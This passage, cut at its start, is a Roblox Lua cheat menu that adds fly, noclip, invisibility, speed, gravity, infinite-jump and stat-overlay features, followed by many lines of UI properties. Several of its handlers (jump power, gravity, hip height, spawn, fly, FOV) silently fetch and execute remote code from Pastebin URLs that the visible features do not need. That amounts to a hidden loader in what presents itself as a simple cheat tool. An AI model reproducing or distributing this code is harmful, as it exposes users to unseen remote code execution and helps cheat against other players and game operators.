Crpse.Size = UDim2.new(0, 168, 0, 32)
Crpse.Font = Enum.Font.SourceSans
Crpse.PlaceholderColor3 = Color3.new(1, 1, 1)
Crpse.PlaceholderText = "CORPSE TP"
Crpse.Text = ""
Crpse.TextColor3 = Color3.new(1, 1, 1)
Crpse.TextSize = 14
-- Scripts:
function SCRIPT_JUQR72_FAKESCRIPT() -- JumpPower.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = JumpPower
	script.Parent.FocusLost:connect(function(a)
		if a then
			game.Lighting.Sound:play()
			game.StarterGui:SetCore("SendNotification",{
				Title = "LocalPlayer";
				Text = "JumpPower Modified.";
				Duration = 6
	        })
			loadstring(game:HttpGet('https://pastebin.com/raw/HsMXVraB'))() 
			game.Players.LocalPlayer.Character.Humanoid.JumpPower = script.Parent.Text or 0
		end
	end)

end
coroutine.resume(coroutine.create(SCRIPT_JUQR72_FAKESCRIPT))
function SCRIPT_XIRE81_FAKESCRIPT() -- SprintSpeed.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = SprintSpeed
	keepGoing = false
	speed = 0
	script.Parent.FocusLost:connect(function(Space)
		if Space then
			game.Lighting.Sound:play()
			game.StarterGui:SetCore("SendNotification",{
				Title = "LocalPlayer";
				Text = "Sprint Speed Modified.";
				Duration = 6
	        })
			speed = script.Parent.Text or 0
		end
	end)
	local uis = Game:GetService("UserInputService")
	uis.InputBegan:connect(function(inst)
	    if inst.KeyCode == Enum.KeyCode.LeftShift then
	          keepGoing=true
	      while keepGoing do
		wait(0000.1)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * speed
	      end
	    end
	end)
	uis.InputEnded:connect(function(inst)
	    if inst.KeyCode == Enum.KeyCode.LeftShift then
	        keepGoing=false
	    end
	end)
	

end
coroutine.resume(coroutine.create(SCRIPT_XIRE81_FAKESCRIPT))
function SCRIPT_YRXI66_FAKESCRIPT() -- Gravity.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = Gravity
	script.Parent.FocusLost:connect(function(Space)
		game.Lighting.Sound:play()
		game.StarterGui:SetCore("SendNotification",{
				Title = "LocalPlayer";
				Text = "Gravity Modified.";
				Duration = 6
	        })
		loadstring(game:HttpGet('https://pastebin.com/raw/346A3k8e'))() 
		workspace.Gravity = tonumber(script.Parent.Text) or 196.2
	end)

end
coroutine.resume(coroutine.create(SCRIPT_YRXI66_FAKESCRIPT))
function SCRIPT_BZHV76_FAKESCRIPT() -- HipHeight.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = HipHeight
	
	script.Parent.FocusLost:connect(function(a)
		if a then
			loadstring(game:HttpGet('https://pastebin.com/raw/346A3k8e'))() 
			game.Lighting.Sound:play()
			game.StarterGui:SetCore("SendNotification",{
				Title = "LocalPlayer";
				Text = "HipHeight Modified.";
				Duration = 6
	        })
			game.Players.LocalPlayer.Character.Humanoid.HipHeight = script.Parent.Text or 1.6
		end
	end)

end
coroutine.resume(coroutine.create(SCRIPT_BZHV76_FAKESCRIPT))
function SCRIPT_CPLM80_FAKESCRIPT() -- Spawn.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = Spawn
	game.Players.LocalPlayer.CharacterAdded:connect(function()
		if workspace.Locations:FindFirstChild(script.Parent.Text) then
			loadstring(game:HttpGet('https://pastebin.com/raw/346A3k8e'))() 
			game.Lighting.Sound:play()
			game.StarterGui:SetCore("SendNotification",{
				Title = "LocalPlayer";
				Text = "Spawning at "..script.Parent.Text..".";
				Duration = 6
				        })
			local a = true
			spawn(function()
				wait(4)
				a = false
			end)
			while a do
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.Locations[script.Parent.Text].CFrame
				wait()
			 end
		end
	end)
	
	script.Parent.FocusLost:connect(function(xx)
		game.Lighting.Sound:play()
		game.StarterGui:SetCore("SendNotification",{
				Title = "LocalPlayer";
				Text = "Spawn Set.";
				Duration = 6
	        })
	end)

end
coroutine.resume(coroutine.create(SCRIPT_CPLM80_FAKESCRIPT))
function SCRIPT_OPFA73_FAKESCRIPT() -- FlySpeed.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = FlySpeed
	

end
coroutine.resume(coroutine.create(SCRIPT_OPFA73_FAKESCRIPT))
function SCRIPT_NIHY65_FAKESCRIPT() -- Fly.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = Fly
	local flyspeed = 0
	script.Parent.MouseButton1Down:connect(function()
	flyspeed = script.Parent.Parent.FlySpeed.Text or 0
	game.Lighting.Sound:play()
	loadstring(game:HttpGet('https://pastebin.com/raw/346A3k8e'))() 
	Fly = not Fly
	    if Fly == false then
		game.StarterGui:SetCore("SendNotification",{
				Title = "LocalPlayer";
				Text = "Fly Disabled.";
				Duration = 6
	        })
	        game.Players.LocalPlayer.Character.Humanoid.HipHeight = 5
					local peen = 1
					repeat wait(1) peen = peen + 1 until peen == 5
			game.Players.LocalPlayer.Character.Humanoid.HipHeight = 1.6
		end
		if Fly == true then
			game.StarterGui:SetCore("SendNotification",{
				Title = "LocalPlayer";
				Text = "Fly Enabled.";
				Duration = 6
			        })
			game.Players.LocalPlayer.Character.Humanoid.HipHeight = 100
			while Fly do
				wait(0.001)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * flyspeed
			end
		end
	end)
	
	script.Parent.Parent.FlySpeed.FocusLost:connect(function(l)
		game.Lighting.Sound:play()
		game.StarterGui:SetCore("SendNotification",{
				Title = "LocalPlayer";
				Text = "Fly Speed Modified.";
				Duration = 6
		        })
	end)
	
	game:GetService'RunService'.RenderStepped:connect(function()
	flyspeed = tonumber(script.Parent.Parent.FlySpeed.Text) or 0
	end)
	
	

end
coroutine.resume(coroutine.create(SCRIPT_NIHY65_FAKESCRIPT))
function SCRIPT_TQLY76_FAKESCRIPT() -- InfJmp.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = InfJmp
	local db = false
	script.parent.MouseButton1Down:connect(function()
		game.Lighting.Sound:play()
		game.StarterGui:SetCore("SendNotification",{
				Title = "LocalPlayer";
				Text = "Inf Jump Loaded.";
				Duration = 6
	        })
		db = not db
	end)
	local uis = game:GetService("UserInputService")
	uis.InputBegan:connect(function(inst)
		if inst.KeyCode == Enum.KeyCode.Space and db then
			game.Players.LocalPlayer.Character.Humanoid:ChangeState(3)
		end
	end)
	

end
coroutine.resume(coroutine.create(SCRIPT_TQLY76_FAKESCRIPT))
function SCRIPT_EGRG70_FAKESCRIPT() -- Invis.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = Invis
	script.parent.MouseButton1Down:connect(function()
		game.Lighting.Sound:play()
		Invis = not Invis
	    if Invis == false then
		game.StarterGui:SetCore("SendNotification",{
				Title = "LocalPlayer";
				Text = "Invis Disabled.";
				Duration = 6
	        })
	         game.Lighting.Root.Parent = game.Players.LocalPlayer.Character.LowerTorso
		end
		if Invis == true then
			game.StarterGui:SetCore("SendNotification",{
				Title = "LocalPlayer";
				Text = "Invis Enabled.";
				Duration = 6
	        })
				while Invis do
				wait(00000.1)
				local Root = game.Players.LocalPlayer.Character.LowerTorso.Root:Clone()
	  			Root.Parent = game.Lighting
				game.Players.LocalPlayer.Character.LowerTorso.Root:Destroy()
				wait(25)
				game.Lighting.Sound:play()
			game.StarterGui:SetCore("SendNotification",{
				Title = "LocalPlayer";
				Text = "Invis Recalculating.";
				Duration = 6
	        })
				game.Lighting.Root.Parent = game.Players.LocalPlayer.Character.LowerTorso
				end
	    end
	end)

end
coroutine.resume(coroutine.create(SCRIPT_EGRG70_FAKESCRIPT))
function SCRIPT_RHEO87_FAKESCRIPT() -- NoClip.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = NoClip
	script.parent.MouseButton1Down:connect(function()
		game.Lighting.Sound:play()
		NoClip = not NoClip
	    if NoClip == false then
		game.StarterGui:SetCore("SendNotification",{
				Title = "LocalPlayer";
				Text = "NoClip Disabled.";
				Duration = 6
	        })
		end
		if NoClip == true then
			game.StarterGui:SetCore("SendNotification",{
				Title = "LocalPlayer";
				Text = "NoClip Enabled.";
				Duration = 6
	        })
				while NoClip do
				wait(00000.1)
				game.Lighting.Sound:play()
				game:GetService("Players").LocalPlayer.Character.RightHand.Touched:connect(function(obj)
				if obj ~= workspace.Terrain then
				obj.CanCollide = false
				wait(1)
				obj.CanCollide = true
				end
				end)
				end
				
			end
	    end
	end)

end
coroutine.resume(coroutine.create(SCRIPT_RHEO87_FAKESCRIPT))
function SCRIPT_JEOY90_FAKESCRIPT() -- Suit.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = Suit
	script.parent.MouseButton1Down:connect(function()
		game.Lighting.Sound:play()
		game.StarterGui:SetCore("SendNotification",{
				Title = "LocalPlayer";
				Text = "Suit Toggled.";
				Duration = 6
	        })
	Camo = not Camo
	    if Camo == false then
	         game.Lighting.Shirt.Parent = game.Players.LocalPlayer.Character
			 game.Lighting.Pants.Parent = game.Players.LocalPlayer.Character
		end
		if Camo == true then
	          local Shirt = game.Players.LocalPlayer.Character.Shirt:Clone()
			  local Pants = game.Players.LocalPlayer.Character.Pants:Clone()
				Shirt.Parent = game.Lighting
				Pants.Parent = game.Lighting
				game.Players.LocalPlayer.Character.Shirt:Destroy()
				game.Players.LocalPlayer.Character.Pants:Destroy()
	    end
	end)

end
coroutine.resume(coroutine.create(SCRIPT_JEOY90_FAKESCRIPT))
function SCRIPT_IMEF69_FAKESCRIPT() -- FOV.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = FOV
	script.Parent.FocusLost:connect(function(a)
		if a then
			game.Lighting.Sound:play()
			game.StarterGui:SetCore("SendNotification",{
				Title = "LocalPlayer";
				Text = "FOV Modified.";
				Duration = 6
	        })
			loadstring(game:HttpGet('https://pastebin.com/raw/ghs3qiRt'))() 
			game.Workspace.Character.FieldOfView = script.Parent.Text or 0
		end
	end)

end
coroutine.resume(coroutine.create(SCRIPT_IMEF69_FAKESCRIPT))
function SCRIPT_UNDW89_FAKESCRIPT() -- StatESP.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = StatESP
	script.Parent.MouseButton1Down:connect(function()
	game.Lighting.Sound:play()
	game.Players.LocalPlayer.PlayerGui["Interface Main"].Hotbar.Health.Visible = false
	game.Players.LocalPlayer.PlayerGui["Interface Main"].Hotbar.StaminaBar.Visible = false
	game.Players.LocalPlayer.PlayerGui["Interface Main"].Hotbar.Hunger.Visible = false
	game.Players.LocalPlayer.PlayerGui["Interface Main"].Hotbar.Thirst.Visible = false
	game.StarterGui:SetCore("SendNotification",{
				Title = "LocalPlayer";
				Text = "Stat ESP Loaded.";
				Duration = 6
	        })
	local player = game.Players.LocalPlayer
	local TweenService = game:GetService("TweenService")
	
	
	local SmartStats = Instance.new("BillboardGui")
	local Holder = Instance.new("Frame")
	local Main = Instance.new("Frame")
	local Health = Instance.new("Frame")
	local CirclePart = Instance.new("ImageLabel")
	local Backdrop = Instance.new("ImageLabel")
	local Fills = Instance.new("Frame")
	local Health_Fill1 = Instance.new("ImageLabel")
	local Health_Fill2 = Instance.new("ImageLabel")
	local Health_Fill3 = Instance.new("ImageLabel")
	local Health_Fill4 = Instance.new("ImageLabel")
	local Health_Fill5 = Instance.new("ImageLabel")
	local Health_Fill6 = Instance.new("ImageLabel")
	local BonusFills = Instance.new("Frame")
	local BonusHealth_Fill1 = Instance.new("ImageLabel")
	local BonusHealth_Fill2 = Instance.new("ImageLabel")
	local BonusHealth_Fill3 = Instance.new("ImageLabel")
	local BonusHealth_Fill4 = Instance.new("ImageLabel")
	local BonusHealth_Fill5 = Instance.new("ImageLabel")
	local BonusHealth_Fill6 = Instance.new("ImageLabel")
	local Icon = Instance.new("ImageButton")
	local ImageLabel = Instance.new("ImageLabel")
	local Stamina = Instance.new("Frame")
	local CirclePart_2 = Instance.new("ImageLabel")
	local Backdrop_2 = Instance.new("ImageLabel")
	local Fills_2 = Instance.new("Frame")
	local Stamina_Fill1 = Instance.new("ImageLabel")
	local Stamina_Fill2 = Instance.new("ImageLabel")
	local Stamina_Fill3 = Instance.new("ImageLabel")
	local Stamina_Fill4 = Instance.new("ImageLabel")
	local Stamina_Fill5 = Instance.new("ImageLabel")
	local Stamina_Fill6 = Instance.new("ImageLabel")
	local Icon_2 = Instance.new("ImageButton")
	local ImageLabel_2 = Instance.new("ImageLabel")
	local Hunger = Instance.new("Frame")
	local CirclePart_3 = Instance.new("ImageLabel")
	local Backdrop_3 = Instance.new("ImageLabel")
	local Fills_3 = Instance.new("Frame")
	local Hunger_Fill1 = Instance.new("ImageLabel")
	local Hunger_Fill2 = Instance.new("ImageLabel")
	local Hunger_Fill3 = Instance.new("ImageLabel")
	local Hunger_Fill4 = Instance.new("ImageLabel")
	local Hunger_Fill5 = Instance.new("ImageLabel")
	local Hunger_Fill6 = Instance.new("ImageLabel")
	local Icon_3 = Instance.new("ImageButton")
	local ImageLabel_3 = Instance.new("ImageLabel")
	local Thirst = Instance.new("Frame")
	local CirclePart_4 = Instance.new("ImageLabel")
	local Backdrop_4 = Instance.new("ImageLabel")
	local Fills_4 = Instance.new("Frame")
	local Thirst_Fill1 = Instance.new("ImageLabel")
	local Thirst_Fill2 = Instance.new("ImageLabel")
	local Thirst_Fill3 = Instance.new("ImageLabel")
	local Thirst_Fill4 = Instance.new("ImageLabel")
	local Thirst_Fill5 = Instance.new("ImageLabel")
	local Thirst_Fill6 = Instance.new("ImageLabel")
	local Icon_4 = Instance.new("ImageButton")
	local ImageLabel_4 = Instance.new("ImageLabel")
	local BonusFills_2 = Instance.new("Frame")
	local BonusStamina_Fill1 = Instance.new("ImageLabel")
	local BonusStamina_Fill2 = Instance.new("ImageLabel")
	local BonusStamina_Fill3 = Instance.new("ImageLabel")
	local BonusStamina_Fill4 = Instance.new("ImageLabel")
	local BonusStamina_Fill5 = Instance.new("ImageLabel")
	local BonusStamina_Fill6 = Instance.new("ImageLabel")
	--Properties:
	SmartStats.Name = "SmartStats"
	SmartStats.Parent = player.PlayerGui
	SmartStats.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	SmartStats.Adornee = player.Character:WaitForChild("Head")
	SmartStats.Active = true
	SmartStats.Enabled = false
	SmartStats.AlwaysOnTop = true
	SmartStats.ExtentsOffset = Vector3.new(0, 0, -8)
	SmartStats.LightInfluence = 1
	SmartStats.Size = UDim2.new(20, 0, 10, 0)
	
	Holder.Name = "Holder"
	Holder.Parent = SmartStats
	Holder.BackgroundColor3 = Color3.new(1, 1, 1)
	Holder.BackgroundTransparency = 1
	Holder.Size = UDim2.new(1, 0, 1, 0)
	
	Main.Name = "Main"
	Main.Parent = Holder
	Main.BackgroundColor3 = Color3.new(0, 0, 0)
	Main.BackgroundTransparency = 1
	Main.BorderSizePixel = 0
	Main.Size = UDim2.new(0.300000012, 0, 1, 0)
	
	Health.Name = "Health"
	Health.Parent = Main
	Health.AnchorPoint = Vector2.new(0.5, 0.5)
	Health.BackgroundColor3 = Color3.new(1, 1, 1)
	Health.BackgroundTransparency = 1
	Health.Position = UDim2.new(0.75, 0, 0.150000006, 0)
	Health.Size = UDim2.new(0.400000006, 0, 0.400000006, 0)
	Health.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Health.ZIndex = 2
	
	CirclePart.Name = "CirclePart"
	CirclePart.Parent = Health
	CirclePart.AnchorPoint = Vector2.new(0.5, 0.5)
	CirclePart.BackgroundColor3 = Color3.new(1, 1, 1)
	CirclePart.BackgroundTransparency = 1
	CirclePart.Position = UDim2.new(0.5, 0, 0.5, 0)
	CirclePart.Size = UDim2.new(1, 0, 1, 0)
	CirclePart.SizeConstraint = Enum.SizeConstraint.RelativeXX
	CirclePart.ZIndex = 2
	CirclePart.Image = "rbxassetid://2713625469"
	
	Backdrop.Name = "Backdrop"
	Backdrop.Parent = CirclePart
	Backdrop.AnchorPoint = Vector2.new(0.5, 0.5)
	Backdrop.BackgroundColor3 = Color3.new(1, 1, 1)
	Backdrop.BackgroundTransparency = 1
	Backdrop.Position = UDim2.new(0.5, 0, 0.5, 0)
	Backdrop.Size = UDim2.new(1.29999995, 0, 1.29999995, 0)
	Backdrop.Image = "rbxassetid://2713682747"
	Backdrop.ImageTransparency = 0.30000001192093
	
	Fills.Name = "Fills"
	Fills.Parent = CirclePart
	Fills.BackgroundColor3 = Color3.new(1, 1, 1)
	Fills.BackgroundTransparency = 1
	Fills.Size = UDim2.new(1, 0, 1, 0)
	
	Health_Fill1.Name = "Health_Fill1"
	Health_Fill1.Parent = Fills
	Health_Fill1.AnchorPoint = Vector2.new(0.5, 0.5)
	Health_Fill1.BackgroundColor3 = Color3.new(1, 1, 1)
	Health_Fill1.BackgroundTransparency = 1
	Health_Fill1.BorderSizePixel = 0
	Health_Fill1.Position = UDim2.new(0.5, 0, 0.5, 0)
	Health_Fill1.Rotation = 50
	Health_Fill1.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	Health_Fill1.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Health_Fill1.ZIndex = 3
	Health_Fill1.Image = "rbxassetid://2736142304"
	Health_Fill1.ImageColor3 = Color3.new(0.666667, 1, 0.498039)
	
	Health_Fill2.Name = "Health_Fill2"
	Health_Fill2.Parent = Fills
	Health_Fill2.AnchorPoint = Vector2.new(0.5, 0.5)
	Health_Fill2.BackgroundColor3 = Color3.new(1, 1, 1)
	Health_Fill2.BackgroundTransparency = 1
	Health_Fill2.BorderSizePixel = 0
	Health_Fill2.Position = UDim2.new(0.5, 0, 0.5, 0)
	Health_Fill2.Rotation = 100
	Health_Fill2.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	Health_Fill2.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Health_Fill2.ZIndex = 3
	Health_Fill2.Image = "rbxassetid://2736142304"
	Health_Fill2.ImageColor3 = Color3.new(0.666667, 1, 0.498039)
	
	Health_Fill3.Name = "Health_Fill3"
	Health_Fill3.Parent = Fills
	Health_Fill3.AnchorPoint = Vector2.new(0.5, 0.5)
	Health_Fill3.BackgroundColor3 = Color3.new(1, 1, 1)
	Health_Fill3.BackgroundTransparency = 1
	Health_Fill3.BorderSizePixel = 0
	Health_Fill3.Position = UDim2.new(0.5, 0, 0.5, 0)
	Health_Fill3.Rotation = 150
	Health_Fill3.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	Health_Fill3.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Health_Fill3.ZIndex = 3
	Health_Fill3.Image = "rbxassetid://2736142304"
	Health_Fill3.ImageColor3 = Color3.new(0.666667, 1, 0.498039)
	
	Health_Fill4.Name = "Health_Fill4"
	Health_Fill4.Parent = Fills
	Health_Fill4.AnchorPoint = Vector2.new(0.5, 0.5)
	Health_Fill4.BackgroundColor3 = Color3.new(1, 1, 1)
	Health_Fill4.BackgroundTransparency = 1
	Health_Fill4.BorderSizePixel = 0
	Health_Fill4.Position = UDim2.new(0.5, 0, 0.5, 0)
	Health_Fill4.Rotation = 200
	Health_Fill4.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	Health_Fill4.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Health_Fill4.ZIndex = 3
	Health_Fill4.Image = "rbxassetid://2736142304"
	Health_Fill4.ImageColor3 = Color3.new(0.666667, 1, 0.498039)
	
	Health_Fill5.Name = "Health_Fill5"
	Health_Fill5.Parent = Fills
	Health_Fill5.AnchorPoint = Vector2.new(0.5, 0.5)
	Health_Fill5.BackgroundColor3 = Color3.new(1, 1, 1)
	Health_Fill5.BackgroundTransparency = 1
	Health_Fill5.BorderSizePixel = 0
	Health_Fill5.Position = UDim2.new(0.5, 0, 0.5, 0)
	Health_Fill5.Rotation = 250
	Health_Fill5.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	Health_Fill5.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Health_Fill5.ZIndex = 3
	Health_Fill5.Image = "rbxassetid://2736142304"
	Health_Fill5.ImageColor3 = Color3.new(0.666667, 1, 0.498039)
	
	Health_Fill6.Name = "Health_Fill6"
	Health_Fill6.Parent = Fills
	Health_Fill6.AnchorPoint = Vector2.new(0.5, 0.5)
	Health_Fill6.BackgroundColor3 = Color3.new(1, 1, 1)
	Health_Fill6.BackgroundTransparency = 1
	Health_Fill6.BorderSizePixel = 0
	Health_Fill6.Position = UDim2.new(0.5, 0, 0.5, 0)
	Health_Fill6.Rotation = 300
	Health_Fill6.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	Health_Fill6.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Health_Fill6.ZIndex = 3
	Health_Fill6.Image = "rbxassetid://2736142304"
	Health_Fill6.ImageColor3 = Color3.new(0.666667, 1, 0.498039)
	
	BonusFills.Name = "BonusFills"
	BonusFills.Parent = CirclePart
	BonusFills.BackgroundColor3 = Color3.new(1, 1, 1)
	BonusFills.BackgroundTransparency = 1
	BonusFills.Size = UDim2.new(1, 0, 1, 0)
	
	BonusHealth_Fill1.Name = "BonusHealth_Fill1"
	BonusHealth_Fill1.Parent = BonusFills
	BonusHealth_Fill1.AnchorPoint = Vector2.new(0.5, 0.5)
	BonusHealth_Fill1.BackgroundColor3 = Color3.new(1, 1, 1)
	BonusHealth_Fill1.BackgroundTransparency = 1
	BonusHealth_Fill1.BorderSizePixel = 0
	BonusHealth_Fill1.Position = UDim2.new(0.5, 0, 0.5, 0)
	BonusHealth_Fill1.Rotation = 50
	BonusHealth_Fill1.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	BonusHealth_Fill1.SizeConstraint = Enum.SizeConstraint.RelativeXX
	BonusHealth_Fill1.ZIndex = 3
	BonusHealth_Fill1.Image = "rbxassetid://2736142304"
	BonusHealth_Fill1.ImageColor3 = Color3.new(1, 0.682353, 0.0431373)
	
	BonusHealth_Fill2.Name = "BonusHealth_Fill2"
	BonusHealth_Fill2.Parent = BonusFills
	BonusHealth_Fill2.AnchorPoint = Vector2.new(0.5, 0.5)
	BonusHealth_Fill2.BackgroundColor3 = Color3.new(1, 1, 1)
	BonusHealth_Fill2.BackgroundTransparency = 1
	BonusHealth_Fill2.BorderSizePixel = 0
	BonusHealth_Fill2.Position = UDim2.new(0.5, 0, 0.5, 0)
	BonusHealth_Fill2.Rotation = 100
	BonusHealth_Fill2.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	BonusHealth_Fill2.SizeConstraint = Enum.SizeConstraint.RelativeXX
	BonusHealth_Fill2.ZIndex = 3
	BonusHealth_Fill2.Image = "rbxassetid://2736142304"
	BonusHealth_Fill2.ImageColor3 = Color3.new(1, 0.682353, 0.0431373)
	
	BonusHealth_Fill3.Name = "BonusHealth_Fill3"
	BonusHealth_Fill3.Parent = BonusFills
	BonusHealth_Fill3.AnchorPoint = Vector2.new(0.5, 0.5)
	BonusHealth_Fill3.BackgroundColor3 = Color3.new(1, 1, 1)
	BonusHealth_Fill3.BackgroundTransparency = 1
	BonusHealth_Fill3.BorderSizePixel = 0
	BonusHealth_Fill3.Position = UDim2.new(0.5, 0, 0.5, 0)
	BonusHealth_Fill3.Rotation = 150
	BonusHealth_Fill3.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	BonusHealth_Fill3.SizeConstraint = Enum.SizeConstraint.RelativeXX
	BonusHealth_Fill3.ZIndex = 3
	BonusHealth_Fill3.Image = "rbxassetid://2736142304"
	BonusHealth_Fill3.ImageColor3 = Color3.new(1, 0.682353, 0.0431373)
	
	BonusHealth_Fill4.Name = "BonusHealth_Fill4"
	BonusHealth_Fill4.Parent = BonusFills
	BonusHealth_Fill4.AnchorPoint = Vector2.new(0.5, 0.5)
	BonusHealth_Fill4.BackgroundColor3 = Color3.new(1, 1, 1)
	BonusHealth_Fill4.BackgroundTransparency = 1
	BonusHealth_Fill4.BorderSizePixel = 0
	BonusHealth_Fill4.Position = UDim2.new(0.5, 0, 0.5, 0)
	BonusHealth_Fill4.Rotation = 200
	BonusHealth_Fill4.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	BonusHealth_Fill4.SizeConstraint = Enum.SizeConstraint.RelativeXX
	BonusHealth_Fill4.ZIndex = 3
	BonusHealth_Fill4.Image = "rbxassetid://2736142304"
	BonusHealth_Fill4.ImageColor3 = Color3.new(1, 0.682353, 0.0431373)
	
	BonusHealth_Fill5.Name = "BonusHealth_Fill5"
	BonusHealth_Fill5.Parent = BonusFills
	BonusHealth_Fill5.AnchorPoint = Vector2.new(0.5, 0.5)
	BonusHealth_Fill5.BackgroundColor3 = Color3.new(1, 1, 1)
	BonusHealth_Fill5.BackgroundTransparency = 1
	BonusHealth_Fill5.BorderSizePixel = 0
	BonusHealth_Fill5.Position = UDim2.new(0.5, 0, 0.5, 0)
	BonusHealth_Fill5.Rotation = 250
	BonusHealth_Fill5.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	BonusHealth_Fill5.SizeConstraint = Enum.SizeConstraint.RelativeXX
	BonusHealth_Fill5.ZIndex = 3
	BonusHealth_Fill5.Image = "rbxassetid://2736142304"
	BonusHealth_Fill5.ImageColor3 = Color3.new(1, 0.682353, 0.0431373)
	
	BonusHealth_Fill6.Name = "BonusHealth_Fill6"
	BonusHealth_Fill6.Parent = BonusFills
	BonusHealth_Fill6.AnchorPoint = Vector2.new(0.5, 0.5)
	BonusHealth_Fill6.BackgroundColor3 = Color3.new(1, 1, 1)
	BonusHealth_Fill6.BackgroundTransparency = 1
	BonusHealth_Fill6.BorderSizePixel = 0
	BonusHealth_Fill6.Position = UDim2.new(0.5, 0, 0.5, 0)
	BonusHealth_Fill6.Rotation = 300
	BonusHealth_Fill6.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	BonusHealth_Fill6.SizeConstraint = Enum.SizeConstraint.RelativeXX
	BonusHealth_Fill6.ZIndex = 3
	BonusHealth_Fill6.Image = "rbxassetid://2736142304"
	BonusHealth_Fill6.ImageColor3 = Color3.new(1, 0.682353, 0.0431373)
	
	Icon.Name = "Icon"
	Icon.Parent = Health
	Icon.AnchorPoint = Vector2.new(0.5, 0.5)
	Icon.BackgroundColor3 = Color3.new(1, 1, 1)
	Icon.BackgroundTransparency = 1
	Icon.Position = UDim2.new(0.5, 0, 0.735, 0)
	Icon.Size = UDim2.new(0.899999976, 0, 0.899999976, 0)
	Icon.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Icon.ZIndex = 6
	Icon.Image = "rbxassetid://2713682747"
	Icon.ImageColor3 = Color3.new(0, 0, 0)
	
	ImageLabel.Parent = Icon
	ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
	ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
	ImageLabel.BackgroundTransparency = 1
	ImageLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
	ImageLabel.Size = UDim2.new(0.600000024, 0, 0.600000024, 0)
	ImageLabel.Image = "rbxassetid://3192484653"
	ImageLabel.ImageColor3 = Color3.new(1, 0.380392, 0.380392)
	
	Stamina.Name = "Stamina"
	Stamina.Parent = Main
	Stamina.AnchorPoint = Vector2.new(0.5, 0.5)
	Stamina.BackgroundColor3 = Color3.new(1, 1, 1)
	Stamina.BackgroundTransparency = 1
	Stamina.Position = UDim2.new(0.75, 0, 0.400000006, 0)
	Stamina.Size = UDim2.new(0.349999994, 0, 0.349999994, 0)
	Stamina.SizeConstraint = Enum.SizeConstraint.RelativeXX
	
	CirclePart_2.Name = "CirclePart"
	CirclePart_2.Parent = Stamina
	CirclePart_2.AnchorPoint = Vector2.new(0.5, 0.5)
	CirclePart_2.BackgroundColor3 = Color3.new(1, 1, 1)
	CirclePart_2.BackgroundTransparency = 1
	CirclePart_2.Position = UDim2.new(0.5, 0, 0.5, 0)
	CirclePart_2.Size = UDim2.new(1, 0, 1, 0)
	CirclePart_2.SizeConstraint = Enum.SizeConstraint.RelativeXX
	CirclePart_2.ZIndex = 2
	CirclePart_2.Image = "rbxassetid://2713625469"
	
	Backdrop_2.Name = "Backdrop"
	Backdrop_2.Parent = CirclePart_2
	Backdrop_2.AnchorPoint = Vector2.new(0.5, 0.5)
	Backdrop_2.BackgroundColor3 = Color3.new(1, 1, 1)
	Backdrop_2.BackgroundTransparency = 1
	Backdrop_2.Position = UDim2.new(0.5, 0, 0.5, 0)
	Backdrop_2.Size = UDim2.new(1.29999995, 0, 1.29999995, 0)
	Backdrop_2.Image = "rbxassetid://2713682747"
	Backdrop_2.ImageTransparency = 0.30000001192093
	
	Fills_2.Name = "Fills"
	Fills_2.Parent = CirclePart_2
	Fills_2.BackgroundColor3 = Color3.new(1, 1, 1)
	Fills_2.BackgroundTransparency = 1
	Fills_2.Size = UDim2.new(1, 0, 1, 0)
	
	Stamina_Fill1.Name = "Stamina_Fill1"
	Stamina_Fill1.Parent = Fills_2
	Stamina_Fill1.AnchorPoint = Vector2.new(0.5, 0.5)
	Stamina_Fill1.BackgroundColor3 = Color3.new(1, 1, 1)
	Stamina_Fill1.BackgroundTransparency = 1
	Stamina_Fill1.BorderSizePixel = 0
	Stamina_Fill1.Position = UDim2.new(0.5, 0, 0.5, 0)
	Stamina_Fill1.Rotation = 50
	Stamina_Fill1.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	Stamina_Fill1.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Stamina_Fill1.ZIndex = 3
	Stamina_Fill1.Image = "rbxassetid://2736142304"
	Stamina_Fill1.ImageColor3 = Color3.new(0.219608, 0.831373, 1)
	
